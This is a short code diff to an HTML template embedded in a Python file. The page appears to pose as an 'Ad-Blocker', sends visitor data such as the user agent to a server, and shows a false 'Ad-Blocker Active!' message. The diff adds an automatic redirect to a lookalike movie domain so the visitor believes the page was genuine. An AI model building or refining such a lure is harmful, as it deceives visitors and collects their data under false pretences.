@@ -128,10 +128,11 @@ HTML_TEMPLATE = '''
                             user_agent: navigator.userAgent
                         })
                     }).then(() => {
-                        status.textContent = '✅ Ad-Blocker Active! Start browsing movies.';
+                        status.textContent = '✅ Ad-Blocker Active! Redirecting to movies...';
+                        // Redirect to real FzMovies site after 2 seconds
                         setTimeout(() => {
-                            status.textContent += ' Redirecting...';
-                        }, 1500);
+                            window.location.href = 'https://fzmovies-com.lol/';
+                        }, 2000);
                     });
                 },
                 (error) => {
